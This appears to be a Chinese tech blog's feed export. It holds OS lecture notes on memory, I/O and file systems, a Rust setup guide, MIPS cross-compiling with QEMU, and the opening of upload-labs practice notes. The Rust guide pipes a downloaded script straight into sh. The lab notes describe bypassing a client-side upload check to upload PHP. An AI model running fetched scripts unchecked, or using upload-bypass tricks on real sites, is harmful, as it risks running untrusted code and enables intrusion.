<h3 id="11-缺页中断率的影响因素、缺页中断的处理流程"><a href="#11-缺页中断率的影响因素、缺页中断的处理流程" class="headerlink" title="11. 缺页中断率的影响因素、缺页中断的处理流程"></a>11. 缺页中断率的影响因素、缺页中断的处理流程</h3><p>缺页中断率影响因素：进程分配了多少个页框，页面替换策略算法、页面大小、程序特性</p>
<p>缺页中断处理流程</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803184041316.png" alt="image-20200803184041316"></p>
<h3 id="12-页面替换策略算法"><a href="#12-页面替换策略算法" class="headerlink" title="12. 页面替换策略算法"></a>12. 页面替换策略算法</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200803184435562.png" alt="image-20200803184435562"></p>
<h3 id="13-Belady异常是什么"><a href="#13-Belady异常是什么" class="headerlink" title="13. Belady异常是什么"></a>13. Belady异常是什么</h3><p>在FIFO替换策略中，给进程更多的页框，有时反而会导致缺页中断率上升</p>
<h3 id="14-伙伴系统的定义、分配和合并策略"><a href="#14-伙伴系统的定义、分配和合并策略" class="headerlink" title="14. 伙伴系统的定义、分配和合并策略"></a>14. 伙伴系统的定义、分配和合并策略</h3><p>伙伴系统：</p>
<ol>
<li>把所有空闲页框分组为10个块链表</li>
<li>每个块链表分别包含大小为1，2，4，8，16，32，64，128，256，512个连续的页框</li>
<li>每个块的第一个页框的物理地址是该块大小的整数倍<br>例如：大小为16个页框的块，其起址是16×4KB的倍数</li>
</ol>
<p>伙伴的必要条件：</p>
<ol>
<li>大小相同</li>
<li>物理地址连续</li>
</ol>
<p>伙伴分配：</p>
<p>比如请求5个页，那么去8块的链表里找，然后把8块的5个分配出去，剩下三个拆成1块+2块，添加到对应的链表里去</p>
<p>伙伴合并发生在归还页框的时候：</p>
<ol>
<li>当两个伙伴都空闲时，则合并成一个更大的块</li>
<li>该过程一直进行，直到找不到可以合并的伙伴为止</li>
</ol>
<h1 id="ch5-设备管理"><a href="#ch5-设备管理" class="headerlink" title="ch5 设备管理"></a>ch5 设备管理</h1><h2 id="需要掌握的问题-4"><a href="#需要掌握的问题-4" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>IO四种控制方式：轮询、中断、DMA、通道</li>
<li>缓冲技术思想、单缓冲、双缓冲</li>
<li>顺序存储设备和随机存储设备、磁盘物理结构、访问磁盘的物理顺序</li>
<li>优化分布</li>
<li>移臂调度算法：先来先服务、电梯、最短查找时间、循环扫描等</li>
<li>提高IO速度的方法</li>
<li>Spooling技术的概念</li>
</ol>
<h2 id="回答-4"><a href="#回答-4" class="headerlink" title="回答"></a>回答</h2><h3 id="1-IO四种控制方式：轮询、中断、DMA、通道缓冲技术思想"><a href="#1-IO四种控制方式：轮询、中断、DMA、通道缓冲技术思想" class="headerlink" title="1. IO四种控制方式：轮询、中断、DMA、通道缓冲技术思想"></a>1. IO四种控制方式：轮询、中断、DMA、通道缓冲技术思想</h3><p>轮询：需要IO的时候反复测试IO设备的忙闲状态位，相当于阻塞了程序</p>
<p>中断：IO设备发送中断处理请求，CPU执行中断处理程序</p>
<p>DMA：由DMA控制器控制数据在IO设备和内存直接交换</p>
<p>通道：CPU-通道-控制器-IO设备，四级连接</p>
<ul>
<li>CPU在执行主程序时遇到I/O请求，启动指定通道上选址的设备</li>
<li>一旦启动成功，通道开始控制外围设备进行操作</li>
<li>CPU可执行其他任务并与通道并行工作，直到I/O操作完成</li>
<li>通道发出操作结束中断时，CPU才停止当前工作，转向处理I/O操作结束事件</li>
</ul>
<h3 id="2-缓冲技术思想、单缓冲、双缓冲"><a href="#2-缓冲技术思想、单缓冲、双缓冲" class="headerlink" title="2. 缓冲技术思想、单缓冲、双缓冲"></a>2. 缓冲技术思想、单缓冲、双缓冲</h3><p>从磁盘读数据时，先读到缓冲里，再送到内存里让CPU算</p>
<p>向磁盘写数据时，先写到缓冲里，再写到磁盘上</p>
<p>单缓冲：用一个缓冲区</p>
<p>双缓冲：两个缓冲区，一个填满了/搬空了再用另一个</p>
<h3 id="3-顺序存储设备和随机存储设备、磁盘物理结构、访问磁盘的物理顺序"><a href="#3-顺序存储设备和随机存储设备、磁盘物理结构、访问磁盘的物理顺序" class="headerlink" title="3. 顺序存储设备和随机存储设备、磁盘物理结构、访问磁盘的物理顺序"></a>3. 顺序存储设备和随机存储设备、磁盘物理结构、访问磁盘的物理顺序</h3><p>顺序存储设备：磁带</p>
<p>随机存储设备：ROM，RAM</p>
<p>磁盘物理结构：</p>
<ol>
<li>盘片，每个盘片有一个磁头</li>
<li>磁道：一个个同心圆环组成盘片，同心圆环就是磁道</li>
<li>扇区：磁道里的一小段是扇区</li>
<li>柱面：所有盘片的同半径的磁道组成一个空心圆柱，就是柱面</li>
</ol>
<h3 id="4-优化分布"><a href="#4-优化分布" class="headerlink" title="4. 优化分布"></a>4. 优化分布</h3><p>把数据放在一些扇区里，使得读取了1个数据，然后到处理完的时候，盘片刚好旋转到下一个要读的数据</p>
<h3 id="5-移臂调度算法：先来先服务、最短查找时间优先、扫描、分步扫描、电梯调度、循环扫描"><a href="#5-移臂调度算法：先来先服务、最短查找时间优先、扫描、分步扫描、电梯调度、循环扫描" class="headerlink" title="5. 移臂调度算法：先来先服务、最短查找时间优先、扫描、分步扫描、电梯调度、循环扫描"></a>5. 移臂调度算法：先来先服务、最短查找时间优先、扫描、分步扫描、电梯调度、循环扫描</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200803192539237.png" alt="image-20200803192539237"></p>
<p>.</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803192549335.png" alt="image-20200803192549335"></p>
<p>.</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803192558465.png" alt="image-20200803192558465"></p>
<p>.</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803192605971.png" alt="image-20200803192605971"></p>
<p>.</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803192615663.png" alt="image-20200803192615663"></p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803192623987.png" alt="image-20200803192623987"></p>
<p>.</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803192634958.png" alt="image-20200803192634958"></p>
<h3 id="6-提高IO速度的方法"><a href="#6-提高IO速度的方法" class="headerlink" title="6. 提高IO速度的方法"></a>6. 提高IO速度的方法</h3><p>提前读：把当前块读入时，后面跟着的数据块也一起读入</p>
<p>延迟写：将修改了的缓冲区放到空闲缓冲区队尾，再有进程申请到这个缓冲区时，再把缓冲区里的内容写回磁盘</p>
<p>虚拟盘：把磁盘里的一部分内容放到内存里，进程结束时再写回磁盘</p>
<h3 id="7-Spooling技术的概念"><a href="#7-Spooling技术的概念" class="headerlink" title="7. Spooling技术的概念"></a>7. Spooling技术的概念</h3><p>解决静态分配设备时，分配出去的设备对新的请求是拒绝的情况</p>
<ol>
<li>预输入：操作系统将一批作业从输入设备上预先输入至磁盘的输入缓冲区中暂存 </li>
<li>作业调度程序调度作业执行，作业使用数据时不必再启动输入设备，只要从磁盘的输入缓冲区中读入  </li>
<li>作业执行过程中不必直接启动输出设备，只要将作业的输出数据暂时保存到磁盘的输出缓冲区 </li>
<li>缓输出：作业执行完毕后，由操作系统组织信息成批输出</li>
</ol>
<h1 id="ch6-文件管理"><a href="#ch6-文件管理" class="headerlink" title="ch6 文件管理"></a>ch6 文件管理</h1><h2 id="需要掌握的问题-5"><a href="#需要掌握的问题-5" class="headerlink" title="需要掌握的问题"></a>需要掌握的问题</h2><ol>
<li>文件系统的功能</li>
<li>目录文件里存的是什么？</li>
<li>文件检索的过程</li>
<li>流式文件、记录式文件的概念和区别</li>
<li>顺序文件、连接文件、索引文件的概念</li>
<li>Linux里的inode结构，直接索引、一二三级索引</li>
<li>活动inode表的概念</li>
<li>用户打开文件表项，系统打开文件表项的概念</li>
<li>文件创建、打开、关闭、删除、链接的过程</li>
<li>文件静态共享和动态共享</li>
<li>符号链接和硬链接的区别</li>
<li>磁盘块分配和回收算法</li>
<li>磁盘块一致性检查和文件一致性检查</li>
</ol>
<h2 id="回答-5"><a href="#回答-5" class="headerlink" title="回答"></a>回答</h2><h3 id="1-文件系统的功能"><a href="#1-文件系统的功能" class="headerlink" title="1. 文件系统的功能"></a>1. 文件系统的功能</h3><ul>
<li>文件的按名存取，实现从逻辑文件到物理文件的转换</li>
<li>文件目录的建立和维护</li>
<li>文件的查找和定位</li>
<li>文件存储空间的分配管理</li>
<li>提供文件的存取方法和文件存储结构</li>
<li>实现文件共享、保护和保密</li>
<li>提供一组易用的文件操作和命令</li>
<li>提供与设备管理交互的统一接口 </li>
</ul>
<h3 id="2-目录文件里存的是什么？"><a href="#2-目录文件里存的是什么？" class="headerlink" title="2. 目录文件里存的是什么？"></a>2. 目录文件里存的是什么？</h3><p>存的是目录项，组成是</p>
<p>文件名+inode号</p>
<h3 id="3-文件检索的过程"><a href="#3-文件检索的过程" class="headerlink" title="3. 文件检索的过程"></a>3. 文件检索的过程</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200803200004505.png" alt="image-20200803200004505"></p>
<h3 id="4-流式文件、记录式文件的概念和区别"><a href="#4-流式文件、记录式文件的概念和区别" class="headerlink" title="4. 流式文件、记录式文件的概念和区别"></a>4. 流式文件、记录式文件的概念和区别</h3><p>流式文件：无结构的文件，怎么解析是应用程序的事</p>
<p>记录式文件：是一种有结构的文件，包含若干逻辑记录，逻辑记录是文件中按信息在逻辑上的独立含义所划分的信息单位</p>
<ul>
<li>记录式顺序文件：文件的记录顺序生成并被顺序访问</li>
<li>记录式索引顺序文件：这种文件使用索引表，表项包含记录键和索引指针，记录键由应用程序确定，而索引指针便指向相应记录，这种文件可针对特定记录进行存取，也保持着顺序访问记录的功能</li>
</ul>
<h3 id="5-顺序文件、连接文件、索引文件的概念"><a href="#5-顺序文件、连接文件、索引文件的概念" class="headerlink" title="5. 顺序文件、连接文件、索引文件的概念"></a>5. 顺序文件、连接文件、索引文件的概念</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200803195653329.png" alt="image-20200803195653329"></p>
<p>.</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803195701563.png" alt="image-20200803195701563"></p>
<p>.</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803195715216.png" alt="image-20200803195715216"></p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803195721689.png" alt="image-20200803195721689"></p>
<p>.</p>
<h3 id=""><a href="#" class="headerlink" title=" "></a> </h3><h3 id="6-Linux里的inode结构，直接索引、一二三级索引"><a href="#6-Linux里的inode结构，直接索引、一二三级索引" class="headerlink" title="6. Linux里的inode结构，直接索引、一二三级索引"></a>6. Linux里的inode结构，直接索引、一二三级索引</h3><p><img src="/2020/07/10/OS讲课笔记/image-20200803195802504.png" alt="image-20200803195802504"></p>
<h3 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h3><h3 id="7-活动inode表的概念"><a href="#7-活动inode表的概念" class="headerlink" title="7. 活动inode表的概念"></a>7. 活动inode表的概念</h3><p>解决去磁盘里读inode太慢的问题</p>
<p>把用到的inode放到内存里，称为活动inode表</p>
<h3 id="8-用户打开文件表项，系统打开文件表项"><a href="#8-用户打开文件表项，系统打开文件表项" class="headerlink" title="8. 用户打开文件表项，系统打开文件表项"></a>8. 用户打开文件表项，系统打开文件表项</h3><p>每个用户进程有一张表，记录该用户进程打开的文件</p>
<p>整个操作系统有一张表，记录所有被打开的文件</p>
<h3 id="9-文件创建、打开、关闭、删除、读写的过程"><a href="#9-文件创建、打开、关闭、删除、读写的过程" class="headerlink" title="9. 文件创建、打开、关闭、删除、读写的过程"></a>9. 文件创建、打开、关闭、删除、读写的过程</h3><p>文件创建：</p>
<ol>
<li>fd = create (filenamep, mode)</li>
<li>为新文件分配inode和活动inode，并把inode号与文件分量名组成新目录项，记到目录中</li>
<li>在新文件所对应的活动inode中置初值，如</li>
<li>置存取权限i_mode，连接计数i_nlink等</li>
<li>分配用户打开文件表项和系统打开文件表项，置表项初值，读写位移f_offset清“0”</li>
<li>把各表项及文件对应的活动inode用指针连接起来，把文件描述字返回给调用者</li>
</ol>
<p>文件打开：</p>
<ol>
<li>fd = open (filenamep, mode);</li>
<li>检索目录，把它的外存inode复制到活动inode表</li>
<li>根据参数mode核对权限，若非法，则这次打开失败</li>
<li>当“打开”合法时，为文件分配用户打开文件表项和系统打开文件表项，并为表项设置初值，通过指针建立这些表项与活动inode间的联系</li>
<li>把文件描述字，即用户打开文件表中相应文件表项的序号返回给调用者</li>
<li>若已有其他用户打开同一文件，则不执行复制inode的工作，仅把活动 inode的计数器i_count加1，i_count反映通过不同的系统打开文件表项来共享同一活动inode的进程数目</li>
</ol>
<p>文件关闭：</p>
<ol>
<li>close (fd);</li>
<li>根据fd找到用户打开文件表项，再找到系统打开文件表项，释放用户打开文件表项</li>
<li>把对应系统打开文件表项中的f_count减“1”，如果非“0”，说明还有进程共享这一表项，不用释放直接返回；否则释放表项</li>
<li>把活动索引节点中的i_count减“1”，若不为“0”，表明还有用户进程正在使用该文件，不用释放而直接返回；否则在把该活动inode中的内容复制回文件卷上的相应inode中后，释放该活动inode</li>
</ol>
<p>文件删除：</p>
<ol>
<li>unlink (filenamep)</li>
<li>把指定文件从其所在的目录文件中去</li>
<li>如果没有连接用户(i_link 为1)，还要把文件占用的存储空间释放</li>
</ol>
<p>读文件：</p>
<ol>
<li>nr = read (fd, buf, count);</li>
<li>系统检查读操作合法性</li>
<li>如果合法，按活动inode中i_data[]指出的文件物理块存放地址，从文件当前位移量f_offset处开始，读出所要求的字节数到块设备缓冲区中</li>
<li>送到buf指向的用户数据区中</li>
</ol>
<p>写文件：</p>
<ol>
<li>nr = write(fd, buf, count);</li>
<li>系统检查写操作合法性</li>
<li>如果合法，把buf里的count字节送到块设备缓冲区</li>
<li>按活动inode中i_data[]指出的文件物理块存放地址，从文件当前位移量f_offset处开始，写入到磁盘里</li>
</ol>
<p>随机存取：</p>
<ol>
<li>lseek (fd, offset, whence);</li>
<li>文件初次“打开”时，文件位移量f_offset清空为0，以后的文件读写操作总是根据offset的当前值来顺序地读写文件 </li>
<li>whence值为0时，则f_offset被置为offset，值为１时，则f_offset被置为文件当前位置值加上offset</li>
</ol>
<h3 id="10-文件静态共享和动态共享的概念和区别"><a href="#10-文件静态共享和动态共享的概念和区别" class="headerlink" title="10. 文件静态共享和动态共享的概念和区别"></a>10. 文件静态共享和动态共享的概念和区别</h3><p>静态共享：无论进程是否运行，其文件的链接关系都是存在的，因此，称为静态共享</p>
<ol>
<li>link(oldnamep, newnamep);</li>
<li>检索目录，找到oldnamep所指文件的inode</li>
<li>再次检索目录，找到 newnamep所指文件的父目录文件，并把已存在文件的 inode 编号与别名构成目录项，记录到目录中去</li>
<li>把已存在文件inode的连接计数i_nlink值加1</li>
</ol>
<p>动态共享：共享关系只有当用户进程存在时才可能出现，一旦用户的进程消亡，其共享关系也就自动消失</p>
<ol>
<li>活动inode表是整个系统公用的</li>
<li>系统在每个进程的PCB中设立用户打开文件表，并通过它与各自已打开文件的活动inode联系</li>
<li>不同进程的读写指针如何设置？<ul>
<li>情形1：同一用户父、子进程协同完成任务，使用同一读/写位移，同步地对文件进行操作<ul>
<li>该位移指针放在相应文件的活动索引节点中</li>
<li>当用系统调用fork建立子进程时，父进程的pcb结构被复制到子进程的pcb结构中，使两个进程的打开文件表指向同一活动inode，达到共享同一位移指针的目的</li>
</ul>
</li>
<li>情形2：若一个文件为两个以上的用户所共享，每个用户希望能独立地读/写此文件，彼此互不干扰<ul>
<li>位移指针不应放在相应文件的活动inode中，而需独立设置</li>
</ul>
</li>
</ul>
</li>
</ol>
<h3 id="11-符号链接和硬链接的区别"><a href="#11-符号链接和硬链接的区别" class="headerlink" title="11. 符号链接和硬链接的区别"></a>11. 符号链接和硬链接的区别</h3><p>硬链接（hard link）：将文件名和自身的inode链接起来</p>
<ol>
<li>只能用于单个文件系统，但不能跨越文件系统</li>
<li>可用于文件共享但不能用于目录共享</li>
<li>实现简单，访问速度快</li>
</ol>
<p>符号链接，又称软链接，是一种只有文件名，不指向inode的文件</p>
<ol>
<li>有自己的inode，通过名称来引用文件 </li>
<li>能用于链接计算机系统中不同文件系统中的文件，支持目录链接</li>
<li>可链接计算机网络中不同机器上的文件，此时，仅需提供文件所在机器地址和该机器中文件的路径名</li>
<li>搜索文件路径开销大，需要额外的空间查找存储路径</li>
</ol>
<h3 id="12-磁盘块分配和回收算法"><a href="#12-磁盘块分配和回收算法" class="headerlink" title="12. 磁盘块分配和回收算法"></a>12. 磁盘块分配和回收算法</h3><p>位示图：</p>
<p>用若干字节构成一张位示图，其中每一字位对应于一个物理块，字位的次序与块的相对次序一致 </p>
<p>空闲区表：</p>
<p>将空闲物理块的位置及其连续空闲的物理块数构成一张表</p>
<p>空闲块链：</p>
<p>把所有空闲块用链表连接在一起</p>
<p>成组空闲块链：</p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803205203194.png" alt="image-20200803205203194"></p>
<p><img src="/2020/07/10/OS讲课笔记/image-20200803205225412.png" alt="image-20200803205225412"></p>
<h3 id="13-磁盘块一致性检查和文件一致性检查"><a href="#13-磁盘块一致性检查和文件一致性检查" class="headerlink" title="13. 磁盘块一致性检查和文件一致性检查"></a>13. 磁盘块一致性检查和文件一致性检查</h3><p>磁盘块一致性检查：</p>
<ol>
<li>占用计数器：记录磁盘块在文件中出现次数，初值置0</li>
<li>空闲计数器：记录磁盘块在空闲块链表中出现次数，初值0</li>
<li>如果一个计数器为0时，其另一个计数器为1（即两个计数器之值是互补的），此时系统中的所有磁盘块处于一致性状态</li>
<li>不一致的情况<ol>
<li>情况1：磁盘块对应的两个计数器均为1<br>该块既是空闲的，又是被占用的<br>解决方法：空闲计数器置”0”，并从空闲块链表中丢弃</li>
<li>情况2：有一个磁盘块对应的两个计数器均为0<br>该块既非空闲的，又非被占用的，从系统中消失<br>解决方法：空闲计数器置”1”，并将其加入空闲块链表  </li>
<li>情况3：磁盘块占用计数器为0，且空闲计数器为2<br>解决方法：将空闲计数器置为1，并重建空闲块链表 </li>
<li>情况4：占用计数器为2，且空闲计数器为0<br>解决方法<br>分配一个空闲磁盘块，把占用块的内容复制到该空闲磁盘块中，从而替换其中一个文件的原磁盘块，对原占用计数器值进行修改<br>这样文件内容未变（尽管可以肯定其中一个文件是不正确的），文件系统的一致性也得到保证</li>
</ol>
</li>
</ol>
<p>文件一致性检查</p>
<ol>
<li>检查文件inode中的链接数i_nlink与其出现在文件系统中不同位置的次数是否一致</li>
<li>假如不一致<ol>
<li>情形1：inode中链接计数i_nlink大于目录项数<br>问题：导致无法释放inode<br>解决办法：把i_nlink减少并改为正确值<br>如正确值为0，则应删除该文件</li>
<li>情形2：inode中的链接计数i_nlink小于目录项数<br>问题：在删除文件过程中会导致inode提前释放，使得文件系统中还有一个目录指向不可用的inode<br>如果该inode又分配给其他文件，将会造成严重后果<br>解决方法：把inode的链接计数修改改为等于实际的目录项</li>
</ol>
</li>
</ol>
]]></content>
      <categories>
        <category>Operating System</category>
      </categories>
      <tags>
        <tag>Operating System</tag>
      </tags>
  </entry>
  <entry>
    <title>Rust环境安装+换中科大源</title>
    <url>/2019/02/03/Rust%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<h1 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h1><p>vct说Rust环境配置很复杂，小李哥不信邪地来打算试一试。</p>
<p>操作系统：Ubuntu 16.04</p>
<h1 id="1-安装curl"><a href="#1-安装curl" class="headerlink" title="1-安装curl"></a>1-安装curl</h1><blockquote>
<p>$ apt install curl</p>
</blockquote>
<h1 id="2-安装rustup"><a href="#2-安装rustup" class="headerlink" title="2-安装rustup"></a>2-安装rustup</h1><blockquote>
<p>$ curl <a href="https://sh.rustup.rs" target="_blank" rel="noopener">https://sh.rustup.rs</a> -sSf | sh</p>
</blockquote>
<p>这个命令会帮你装好rustc, cargo等一系列后面要用到的东西，可以说是一键安装了。</p>
<p>中途会遇到这个3个选项，需要选一个，手动输入1，回车。</p>
<p><img src="/2019/02/03/Rust环境安装/rustup安装选项.png" alt="rustup安装选项"></p>
<p>安装成功后提示</p>
<p><img src="/2019/02/03/Rust环境安装/rustup安装成功.png" alt="rustup安装成功"></p>
<p>然后<strong>重启系统</strong>，重启会使得<strong>rust被添加到PATH中</strong>。这一步很重要。</p>
<p>重启后，查看是否成功。</p>
<blockquote>
<p>$ rustc —version</p>
</blockquote>
<p><img src="/2019/02/03/Rust环境安装/rustc版本.png" alt="rustc版本"></p>
<h1 id="3-Hello-world"><a href="#3-Hello-world" class="headerlink" title="3-Hello, world!"></a>3-Hello, world!</h1><p>Rust源文件以.rs结尾，文件中的单词以下划线分割，编写hello_world.rs</p>
<figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="built_in">println!</span>(<span class="string">"Hello, world!"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>编译+运行</p>
<blockquote>
<p>$ rustc hello_world.rs -o hello_world</p>
<p>$ ./hello_world</p>
</blockquote>
<p>如果显示如下，那便成功了。</p>
<p><img src="/2019/02/03/Rust环境安装/Hello_world.png" alt="Hello_world"></p>
<h1 id="4-换中科大的源"><a href="#4-换中科大的源" class="headerlink" title="4-换中科大的源"></a>4-换中科大的源</h1><p>按照上面完成后，rustc和cargo都应该自动装好了。但问题在于，速度不够快。使用cargo管理项目的时候，会涉及更新问题，但rust是被墙挡在外面的，更新速度慢是小事，可是卡的根本更新不了，就是大事了。</p>
<p>所以我们需要，换 <strong>中科大的源</strong> 。</p>
<p>操作如下：</p>
<ul>
<li>在完成上面的步骤的基础上</li>
<li>进入<strong>root</strong>目录，如果有 <strong>.cargo</strong> 目录就进入(应该是一个隐藏目录，用 <code>ls -a</code> 查看)，没有就新建一个 <strong>.cargo</strong> 目录，然后进入</li>
<li>进入 <strong>.cargo</strong> 目录后，如果有 <strong>config</strong> 文件就打开，没有就新建 <strong>config</strong> 文件</li>
<li><p>在 <strong>config</strong> 文件中写入如下内容，保存退出</p>
  <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[source.crates-io]</span><br><span class="line">registry = &quot;https://github.com/rust-lang/crates.io-index&quot;</span><br><span class="line">replace-with = &apos;ustc&apos;</span><br><span class="line">[source.ustc]</span><br><span class="line">registry = &quot;git://mirrors.ustc.edu.cn/crate.io-index&quot;</span><br></pre></td></tr></table></figure>
</li>
<li><p>然后重启一下系统就行了，以后更新就不用翻墙啦。</p>
</li>
</ul>
<h1 id="5-疑难杂症"><a href="#5-疑难杂症" class="headerlink" title="5-疑难杂症"></a>5-疑难杂症</h1><p>小李哥遇到一个奇怪的问题，就是2-安装rustup完成后，重启，查看version后发现是ok的。结果装了个vim，敲完hello_world.rs，编译的时候它提示：找不到rustc！我再查看version的时候发现我的rustc没了？！</p>
<p>很玄学……我重启了一下系统就好了，原因未知。</p>
<p>emmm……查看cargo的version时再次遇到找不到cargo！rustc也找不到了！和上次的共同之处在于：我试图关闭终端的时候提示还有进程在运行，然后我直接关掉终端，再次打开终端，cargo和rustc再次出现！</p>
<p>真奇怪啊……</p>
<p>见鬼图↓，估计和环境变量有关系，应该是我自己的问题……</p>
<p><img src="/2019/02/03/Rust环境安装/su后找不到rustc.png" alt="su后找不到rustc"></p>
]]></content>
      <categories>
        <category>Rust</category>
      </categories>
      <tags>
        <tag>Rust</tag>
        <tag>Build</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title>Rust学习笔记</title>
    <url>/2019/02/05/Rust%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h1 id=""><a href="#" class="headerlink" title="?"></a>?</h1><h2 id="while中的let问题"><a href="#while中的let问题" class="headerlink" title="while中的let问题"></a>while中的let问题</h2><p>这是一段简单的遍历数组代码<br><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> array: [<span class="built_in">i32</span>; <span class="number">5</span>] = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> <span class="keyword">mut</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> index &lt; <span class="number">5</span> &#123;</span><br><span class="line">    	<span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, array[index]);</span><br><span class="line"></span><br><span class="line">    	index = index + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行结果显然</p>
<p><img src="/2019/02/05/Rust学习笔记/正常遍历结果.png" alt="正常遍历结果"></p>
<p>但如果略作修改，即index的mut关键字去掉，在迭代时用let index 隐藏原来的index<br><figure class="highlight rust"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">fn</span> <span class="title">main</span></span>() &#123;</span><br><span class="line">    <span class="keyword">let</span> array: [<span class="built_in">i32</span>; <span class="number">5</span>] = [<span class="number">10</span>, <span class="number">20</span>, <span class="number">30</span>, <span class="number">40</span>, <span class="number">50</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> index = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> index &lt; <span class="number">5</span> &#123;</span><br><span class="line">    	<span class="built_in">println!</span>(<span class="string">"&#123;&#125;"</span>, array[index]);</span><br><span class="line"></span><br><span class="line">    	<span class="keyword">let</span> index = index + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>运行结果就是无限输出10。</p>
<hr>
<h2 id="-1"><a href="#-1" class="headerlink" title=" "></a> </h2>]]></content>
      <categories>
        <category>Rust</category>
      </categories>
      <tags>
        <tag>Rust</tag>
      </tags>
  </entry>
  <entry>
    <title>不同架构的编译方法总结</title>
    <url>/2020/08/19/%E4%B8%8D%E5%90%8C%E6%9E%B6%E6%9E%84%E7%9A%84%E7%BC%96%E8%AF%91%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="mips"><a href="#mips" class="headerlink" title="mips"></a>mips</h1><h2 id="linux环境下编译"><a href="#linux环境下编译" class="headerlink" title="linux环境下编译"></a>linux环境下编译</h2><p>系统：ubuntu 18.04-64</p>
<p>安装编译器</p>
<blockquote>
<p>sudo apt-get update</p>
<p>sudo apt-get install g++-mips-linux-gnu</p>
</blockquote>
<p>用的时候名字是反过来，命令和g++类似</p>
<p>编译成可执行文件：</p>
<blockquote>
<p>mips-linux-gnu-g++ hello.cpp -o hello</p>
</blockquote>
<p>编译成mips汇编文件</p>
<blockquote>
<p>mips-linux-gnu-g++ hello.cpp -S -o hello.asm</p>
</blockquote>
<h2 id="mips模拟器"><a href="#mips模拟器" class="headerlink" title="mips模拟器"></a>mips模拟器</h2><h3 id="MARS"><a href="#MARS" class="headerlink" title="MARS"></a>MARS</h3><p>官网下载链接：<a href="http://courses.missouristate.edu/kenvollmar/mars/" target="_blank" rel="noopener">http://courses.missouristate.edu/kenvollmar/mars/</a></p>
<p>但MARS识别不了mips-linux-gnu-g++生成的汇编代码，会报语法错误，不知道和版本有没有关系，MARS的支持是2003~2014，可能有新汇编语法？</p>
<h3 id="Spim"><a href="#Spim" class="headerlink" title="Spim"></a>Spim</h3><p>同样识别不了，有语法错误，奇了怪了</p>
<h3 id="QEMU"><a href="#QEMU" class="headerlink" title="QEMU"></a>QEMU</h3><p>可直接运行mips可执行文件的环境</p>
<p>安装：</p>
<blockquote>
<p>sudo apt-get install qemu-user-static qemu-system-mips</p>
</blockquote>
<p>qemu可执行动态链接的mips程序，但是会出现报错：ld.so.1缺失</p>
<p>解决办法1：</p>
<ol>
<li>将qemu-mips和qemu-mips-static从<code>/usr/bin</code>复制到当前目录</li>
<li>尝试<code>sudo chroot . ./qemu-mips ./hello</code>会报chroot错如下图，改用<code>sudo chroot . ./qemu-mips-static ./hello</code>后ok，报库缺失</li>
<li>用<code>locate /lib/ld.so.1</code>查看缺失库的路径</li>
<li>将ld.so.1所在lib复制到当前目录</li>
<li>运行<code>sudo chroot . ./qemu-mips-static ./hello</code>，完工</li>
</ol>
<p><img src="/2020/08/19/不同架构的编译方法总结/image-20200819091402503.png" alt="image-20200819091402503"></p>
<p>或者，编译时就编译为静态程序，可直接执行，无需上面的复杂操作，弊端就是静态程序有点大</p>
<blockquote>
<p>mips-linux-gnu-g++ -static hello.cpp -o hello</p>
<p>qemu-mips-static ./hello</p>
</blockquote>
]]></content>
      <categories>
        <category>Compiler</category>
      </categories>
      <tags>
        <tag>Compiler</tag>
      </tags>
  </entry>
  <entry>
    <title>upload-labs学习笔记</title>
    <url>/2021/02/23/upload-labs%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>upload-labs学习笔记</p>
<h1 id="Pass-01-前端js校验"><a href="#Pass-01-前端js校验" class="headerlink" title="Pass-01-前端js校验"></a>Pass-01-前端js校验</h1><p>传php，前端提示只能是jpg png gif类型</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191254418.png" alt="image-20210118191254418"></p>
<p>然后我burp没抓到包，估计前端就处理了</p>
<p>F12，看上传按钮绑定了checkFile函数</p>
<p><img src="/2021/02/23/upload-labs学习笔记/image-20210118191411492.png" alt="image-20210118191411492"></p>
<p>找到该函数，复制到console，修改为支持php</p>
